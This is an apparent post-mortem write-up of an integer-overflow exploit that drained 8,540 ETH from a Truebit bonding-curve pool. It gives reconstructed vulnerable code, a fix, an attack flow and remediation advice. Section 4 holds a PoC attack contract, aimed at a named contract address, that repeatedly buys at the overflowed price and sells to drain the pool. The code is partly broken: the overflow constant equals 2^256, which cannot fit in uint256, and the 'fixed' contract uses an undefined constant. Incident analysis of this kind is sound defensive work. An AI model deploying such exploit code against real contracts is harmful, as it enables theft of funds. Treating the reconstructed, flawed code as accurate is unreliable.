# Truebit — Bonding Curve Price Calculation Overflow Analysis

| Field | Details |
|------|------|
| **Date** | 2026-01-09 |
| **Protocol** | Truebit |
| **Chain** | Ethereum |
| **Loss** | 8,540 ETH |
| **Attacker** | [0x6C8EC8f14bE7C01672d31CFa5f2CEfeAB2562b50](https://etherscan.io/address/0x6C8EC8f14bE7C01672d31CFa5f2CEfeAB2562b50) |
| **Attack Contract** | Unknown |
| **Attack Tx** | Unknown |
| **Vulnerable Contract** | [0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2](https://etherscan.io/address/0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2) |
| **Root Cause** | The bonding curve calculation in `getPurchasePrice()` overflows on extreme quantity inputs, returning an artificially low price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

Truebit's TRU token price is determined via a Bonding Curve mechanism. The `getPurchasePrice()` function calculates the ETH amount required to purchase a given quantity of tokens.

The vulnerability is an **integer overflow** that occurs during this calculation. Supplying an extremely large quantity causes intermediate computed values to exceed the `uint256` range and wrap around, ultimately returning a near-zero ETH price.

The attacker exploited this to:
1. Purchase TRU in bulk at near-zero cost by triggering the overflow price
2. Sell the acquired TRU back to the pool at the normal price
3. Repeat this cycle to drain all ETH from the pool

---

## 2. Vulnerable Code Analysis

### Vulnerable Code (Reconstructed)

```solidity
// ❌ Vulnerable: bonding curve price calculation with no overflow check
// Solidity 0.7.x or below, or using an unchecked block
contract TruebitPool {
    uint256 public reserveBalance;  // ETH balance in the pool
    uint256 public totalSupply;     // Total TRU tokens minted

    // Bonding curve: price = reserveBalance / totalSupply (simplified)
    // In practice, a quadratic or exponential function
    function getPurchasePrice(uint256 amount) public view returns (uint256) {
        // ❌ Overflow possible: when amount is very large
        // (totalSupply + amount)^2 exceeds uint256 → wraps around
        uint256 newSupply = totalSupply + amount;
        uint256 newReserve = reserveBalance * newSupply * newSupply
                             / (totalSupply * totalSupply); // ❌ Overflow!

        // After overflow, newReserve becomes a very small value
        // → cost = newReserve - reserveBalance is near-negative or 0
        return newReserve - reserveBalance; // ❌ Possible underflow or returns 0
    }

    function buy(uint256 amount) external payable {
        uint256 cost = getPurchasePrice(amount); // ❌ Returns near-zero
        require(msg.value >= cost, "Insufficient payment");
        _mint(msg.sender, amount);
        reserveBalance += msg.value;
    }

    function sell(uint256 amount) external {
        uint256 proceeds = getSalePrice(amount); // Normal price calculation
        _burn(msg.sender, amount);
        reserveBalance -= proceeds;
        payable(msg.sender).transfer(proceeds);
    }
}
```

### Fixed Code

```solidity
// ✅ Fixed: use SafeMath or Solidity 0.8.x + input range restriction
contract TruebitPool {
    uint256 public reserveBalance;
    uint256 public totalSupply;
    uint256 constant MAX_PURCHASE = 1_000_000 * 1e18; // Maximum purchase quantity cap

    function getPurchasePrice(uint256 amount) public view returns (uint256) {
        // ✅ Restrict input range
        require(amount > 0 && amount <= MAX_PURCHASE, "Invalid amount");

        uint256 newSupply = totalSupply + amount;

        // ✅ Solidity 0.8.x reverts on overflow by default
        // Or use explicit SafeMath
        uint256 newReserve = reserveBalance * newSupply * newSupply
                             / (totalSupply * totalSupply);

        require(newReserve > reserveBalance, "Price calculation underflow");
        return newReserve - reserveBalance;
    }

    // ✅ Added: price sanity check
    function buy(uint256 amount) external payable {
        uint256 cost = getPurchasePrice(amount);
        // ✅ Minimum price check (revert if ETH price is unreasonably low)
        require(cost >= MIN_PRICE_PER_TOKEN * amount / 1e18, "Price too low");
        require(msg.value >= cost, "Insufficient payment");
        _mint(msg.sender, amount);
        reserveBalance += msg.value;
    }
}
```

---

## 3. Attack Flow

```
Attacker (0x6C8E...b50)
  │
  ├─[1] Compute overflow threshold
  │       Search for X where getPurchasePrice(X) is minimized
  │       (off-chain computation)
  │
  ├─[2] Round 1 Attack: bulk-buy TRU at overflow price
  │       amount = overflow-triggering quantity
  │       getPurchasePrice(amount) → overflow → returns ~0 ETH
  │       call buy(amount), send minimal ETH
  │       → acquire large amount of TRU (pool: nearly no ETH lost)
  │
  ├─[3] Sell acquired TRU back to pool at normal price
  │       sell(amount)
  │       → receive ETH at normal getSalePrice()
  │       Attacker: +ETH, Pool: -ETH -TRU
  │
  ├─[4] Repeat (until pool is drained)
  │       ┌─ buy(overflow amount) → tiny ETH → large TRU
  │       └─ sell(TRU) → receive normal ETH
  │       Pool ETH decreases each cycle
  │
  └─[5] Pool fully drained
        Total stolen: 8,540 ETH
```

---

## 4. PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0; // ❌ 0.7.x has no built-in overflow checks

interface ITruebitPool {
    function getPurchasePrice(uint256 amount) external view returns (uint256);
    function buy(uint256 amount) external payable;
    function sell(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

contract TruebitAttack {
    ITruebitPool constant pool = ITruebitPool(0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2);

    // Overflow amount calculated off-chain
    uint256 constant OVERFLOW_AMOUNT = 115792089237316195423570985008687907853269984665640564039457584007913129639936;
    // = 2^256 / (some_factor) - totalSupply → triggers overflow

    function findOverflowAmount() external view returns (uint256 price) {
        // Search for a quantity just before/after overflow where price approaches 0
        // (In the actual attack, an off-chain binary search finds the optimal value)
        price = pool.getPurchasePrice(OVERFLOW_AMOUNT);
    }

    function attack() external payable {
        uint256 ethBalance = address(pool).balance;

        // Repeat until pool is drained
        while (address(pool).balance > 0.1 ether) {
            // [2] Buy TRU at overflow price (large TRU for tiny ETH)
            uint256 cost = pool.getPurchasePrice(OVERFLOW_AMOUNT);
            require(cost < 0.001 ether, "Overflow not triggered");
            pool.buy{value: cost}(OVERFLOW_AMOUNT);

            // [3] Sell acquired TRU at normal price
            uint256 truBalance = pool.balanceOf(address(this));
            pool.sell(truBalance);
        }

        // Transfer stolen ETH to attacker
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Integer Overflow |
| **Attack Vector** | Trigger price calculation overflow via extreme quantity input |
| **Impact Scope** | Entire Truebit token pool (8,540 ETH) |
| **DASP Classification** | Arithmetic Overflow/Underflow |
| **CWE** | CWE-190: Integer Overflow or Wraparound |
| **Severity** | Critical |

### Detailed Description

Bonding curve implementations that use quadratic or higher-order functions produce intermediate computed values that grow extremely fast. In Solidity 0.7.x and below, overflow silently wraps rather than reverting, allowing an attacker to manipulate the result to approach zero.

The risk is especially acute when the price calculation logic differs between `buy()` and `sell()` — if `buy()` is overflow-vulnerable while `sell()` operates normally, the attacker can purchase cheaply via overflow and sell at the normal price, extracting a profit on every cycle.

---

## 6. Remediation Recommendations

1. **Use Solidity 0.8.x or above**: Built-in overflow checks prevent silent wraparound
2. **Apply SafeMath library**: If Solidity 0.7.x or below is unavoidable, apply SafeMath to all arithmetic operations
3. **Enforce input upper bounds**: Add quantity limits such as `require(amount <= MAX_PURCHASE)`
4. **Price sanity checks**: Revert if the calculated price falls below a minimum threshold
5. **Formal bonding curve verification**: Mathematically analyze the maximum value range of the formula in use to identify overflow conditions in advance
6. **Fuzz Testing**: Use Foundry/Echidna or similar tools to automate testing against extreme input values

---

## 7. Lessons Learned

- **Solidity below 0.8.x is completely unprotected against overflow**: Legacy code or `unchecked` blocks used for optimization require a thorough review of every arithmetic operation.
- **Bonding curves are especially vulnerable to extreme inputs**: Price models using higher-order functions must strictly bound the input range and mathematically analyze overflow conditions.
- **buy/sell asymmetry creates an immediate arbitrage opportunity**: When the price calculation logic differs between the two functions, a vulnerability in one combines with the normal behavior of the other to create a profit-extraction path.
- **Fuzz testing is highly effective for detecting overflows**: Fuzz testing, which automatically generates boundary and extreme values, reliably surfaces overflow conditions that are easy to miss in manual testing.